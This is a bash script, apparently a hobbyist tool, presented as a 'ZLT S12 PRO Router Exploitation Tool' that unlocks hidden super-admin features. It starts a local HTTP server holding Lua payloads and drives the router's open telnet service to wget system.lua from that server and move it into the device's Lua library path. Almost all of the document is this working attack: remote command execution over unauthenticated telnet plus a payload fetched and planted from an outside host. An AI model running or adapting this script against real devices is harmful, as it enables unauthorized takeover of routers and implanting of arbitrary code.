#!/bin/bash
# Script to leverage telnet vulnerability in order to unlock hidden features in super admin panel
# ZLT S12 PRO Router Exploitation Tool

set -e
set -u

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONFIG_FILE="$SCRIPT_DIR/../config.json"
LOG_FILE="$SCRIPT_DIR/../logs/superadmin.log"

# Default configuration
DEFAULT_CONFIG='{
  "target_host": "192.168.254.254",
  "target_port": "23",
  "http_port": "6969",
  "timeout": "10",
  "log_level": "INFO"
}'

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Global variables
TARGET_HOST=""
TARGET_PORT=""
HTTP_PORT=""
TIMEOUT=""
LOG_LEVEL=""

# Logging function
log() {
    local level=$1
    shift
    local message="$*"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    mkdir -p "$(dirname "$LOG_FILE")"
    
    echo "[$timestamp] [$level] $message" >> "$LOG_FILE"
    
    case $level in
        "ERROR")
            echo -e "${RED}[ERROR]${NC} $message" >&2
            ;;
        "SUCCESS")
            echo -e "${GREEN}[SUCCESS]${NC} $message"
            ;;
        "WARNING")
            echo -e "${YELLOW}[WARNING]${NC} $message"
            ;;
        "INFO")
            echo -e "${BLUE}[INFO]${NC} $message"
            ;;
        *)
            echo "$message"
            ;;
    esac
}

# Check if jq is available
check_dependencies() {
    if ! command -v jq &> /dev/null; then
        log "ERROR" "jq is required for JSON configuration management"
        log "INFO" "Please install jq: sudo apt-get install jq (Ubuntu/Debian) or brew install jq (macOS)"
        exit 1
    fi
}

# Create default config file if it doesn't exist
create_default_config() {
    if [ ! -f "$CONFIG_FILE" ]; then
        log "INFO" "Creating default configuration file at $CONFIG_FILE"
        echo "$DEFAULT_CONFIG" | jq '.' > "$CONFIG_FILE"
        log "SUCCESS" "Default configuration created"
    fi
}

# Load configuration from JSON file
load_config() {
    if [ ! -f "$CONFIG_FILE" ]; then
        log "ERROR" "Configuration file not found: $CONFIG_FILE"
        create_default_config
    fi
    
    TARGET_HOST=$(jq -r '.target_host' "$CONFIG_FILE")
    TARGET_PORT=$(jq -r '.target_port' "$CONFIG_FILE")
    HTTP_PORT=$(jq -r '.http_port' "$CONFIG_FILE")
    TIMEOUT=$(jq -r '.timeout' "$CONFIG_FILE")
    LOG_LEVEL=$(jq -r '.log_level' "$CONFIG_FILE")
    
    log "INFO" "Configuration loaded from $CONFIG_FILE"
    log "INFO" "Target: $TARGET_HOST:$TARGET_PORT"
}

# Save configuration to JSON file
save_config() {
    local temp_config=$(mktemp)
    jq --arg host "$TARGET_HOST" \
       --arg port "$TARGET_PORT" \
       --arg http_port "$HTTP_PORT" \
       --arg timeout "$TIMEOUT" \
       --arg log_level "$LOG_LEVEL" \
       '.target_host = $host | .target_port = $port | .http_port = $http_port | .timeout = $timeout | .log_level = $log_level' \
       "$CONFIG_FILE" > "$temp_config"
    
    mv "$temp_config" "$CONFIG_FILE"
    log "SUCCESS" "Configuration saved to $CONFIG_FILE"
}

# Display current configuration
show_config() {
    echo
    echo "=== Current Configuration ==="
    echo "Target Host: $TARGET_HOST"
    echo "Target Port: $TARGET_PORT"
    echo "HTTP Port: $HTTP_PORT"
    echo "Timeout: $TIMEOUT seconds"
    echo "Log Level: $LOG_LEVEL"
    echo "============================"
    echo
}

# Edit configuration interactively
edit_config() {
    echo
    echo "=== Configuration Editor ==="
    show_config
    
    read -p "Enter new target host [$TARGET_HOST]: " new_host
    if [ -n "$new_host" ]; then
        TARGET_HOST="$new_host"
    fi
    
    read -p "Enter new target port [$TARGET_PORT]: " new_port
    if [ -n "$new_port" ]; then
        TARGET_PORT="$new_port"
    fi
    
    read -p "Enter new HTTP port [$HTTP_PORT]: " new_http_port
    if [ -n "$new_http_port" ]; then
        HTTP_PORT="$new_http_port"
    fi
    
    read -p "Enter new timeout [$TIMEOUT]: " new_timeout
    if [ -n "$new_timeout" ]; then
        TIMEOUT="$new_timeout"
    fi
    
    save_config
    echo
    echo "=== Updated Configuration ==="
    show_config
}

# Validate IP address
validate_ip() {
    local ip=$1
    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        return 0
    else
        return 1
    fi
}

# Test network connectivity
test_connectivity() {
    log "INFO" "Testing connectivity to $TARGET_HOST:$TARGET_PORT..."
    
    if ! validate_ip "$TARGET_HOST"; then
        log "ERROR" "Invalid IP address: $TARGET_HOST"
        return 1
    fi
    
    if timeout "$TIMEOUT" bash -c "</dev/tcp/$TARGET_HOST/$TARGET_PORT" 2>/dev/null; then
        log "SUCCESS" "Connection to $TARGET_HOST:$TARGET_PORT successful"
        return 0
    else
        log "ERROR" "Cannot connect to $TARGET_HOST:$TARGET_PORT"
        return 1
    fi
}

# Start HTTP server for payload delivery
start_http_server() {
    local payload_dir="$SCRIPT_DIR/../payloads"
    mkdir -p "$payload_dir"

    if [ ! -f "$payload_dir/api.lua" ] && [ ! -f "$payload_dir/system.lua" ]; then
        log "ERROR" "Payload scripts not found in $payload_dir"
        return 1
    fi

    log "INFO" "Starting HTTP server on port $HTTP_PORT..."
    cd "$payload_dir"
    
    if command -v busybox &> /dev/null; then
        busybox httpd -p "$HTTP_PORT" -h . &
    else
        log "ERROR" "No HTTP server available"
        return 1
    fi
    
    HTTP_PID=$!
    sleep 2
    
    if kill -0 "$HTTP_PID" 2>/dev/null; then
        log "SUCCESS" "HTTP server started (PID: $HTTP_PID)"
        return 0
    else
        log "ERROR" "Failed to start HTTP server"
        return 1
    fi
}

# Execute telnet commands
execute_telnet_commands() {
    log "INFO" "Executing telnet commands on $TARGET_HOST:$TARGET_PORT..."
    
    local my_ip=$(ip route get 8.8.8.8 | awk '{print $7; exit}' 2>/dev/null || echo "127.0.0.1")
    local wget_url="http://$my_ip:$HTTP_PORT/system.lua"
    
    log "INFO" "Payload URL: $wget_url"
    
    {
        sleep 2
        echo ""
        sleep 1
        echo "cd /tmp"
        sleep 1
        echo "wget $wget_url -O system.lua"
        sleep 2
        echo "mv system.lua usr/lib/lua/tz"
        sleep 2
        echo "exit"
        sleep 1
    } | timeout "$TIMEOUT" telnet "$TARGET_HOST" "$TARGET_PORT" 2>&1 | while read -r line; do
        log "INFO" "Telnet: $line"
    done
    
    local telnet_result=${PIPESTATUS[1]}
    
    if [ $telnet_result -eq 0 ]; then
        log "SUCCESS" "Success, Can now proceed with the update"
        return 0
    else
        log "ERROR" "Telnet execution failed"
        return 1
    fi
}

# Cleanup function
cleanup() {
    log "INFO" "Cleaning up..."
    
    if [ -n "${HTTP_PID:-}" ] && kill -0 "$HTTP_PID" 2>/dev/null; then
        kill "$HTTP_PID"
        log "INFO" "HTTP server stopped"
    fi
    
    log "INFO" "Cleanup completed"
}

trap cleanup EXIT

# Main exploitation function
run_exploit() {
    log "INFO" "Starting ZLT S12 PRO exploitation..."
    
    if ! test_connectivity; then
        log "ERROR" "Connectivity test failed. Cannot proceed."
        return 1
    fi
    
    if ! start_http_server; then
        log "ERROR" "Failed to start HTTP server. Cannot proceed."
        return 1
    fi
    
    if ! execute_telnet_commands; then
        log "ERROR" "Telnet execution failed."
        return 1
    fi
    
    log "SUCCESS" "Exploitation completed!"
    log "INFO" "Check the target device for unlocked features"
}

# Show help
show_help() {
    echo "ZLT S12 PRO Router Exploitation Tool"
    echo
    echo "Usage: $0 [option]"
    echo
    echo "Options:"
    echo "  0          Run exploit with current configuration"
    echo "  1          Edit configuration"
    echo "  2          Show current configuration"
    echo "  3          Reset to default configuration"
    echo "  -h, --help Show this help message"
    echo
    echo "Configuration file: $CONFIG_FILE"
    echo "Log file: $LOG_FILE"
}

# Main function
main() {
    log "INFO" "ZLT S12 PRO Router Exploitation Tool started"
    
    check_dependencies
    
    create_default_config
    
    load_config
    
    show_config
    
    echo "Options:"
    echo "0 - Run exploit"
    echo "1 - Edit configuration"
    echo "2 - Show configuration"
    echo "3 - Reset configuration"
    echo
    
    read -p "Select option [0]: " choice
    choice=${choice:-0}
    
    case $choice in
        0)
            log "INFO" "Running exploit with current configuration..."
            run_exploit
            ;;
        1)
            edit_config
            read -p "Run exploit with new configuration? (y/N): " run_now
            if [[ $run_now =~ ^[Yy]$ ]]; then
                run_exploit
            fi
            ;;
        2)
            show_config
            ;;
        3)
            echo "$DEFAULT_CONFIG" | jq '.' > "$CONFIG_FILE"
            log "SUCCESS" "Configuration reset to defaults"
            load_config
            show_config
            ;;
        *)
            log "ERROR" "Invalid option: $choice"
            show_help
            exit 1
            ;;
    esac
}

if [ $# -gt 0 ]; then
    case $1 in
        -h|--help)
            show_help
            exit 0
            ;;
        *)
            log "ERROR" "Unknown argument: $1"
            show_help
            exit 1
            ;;
    esac
fi

main "$@"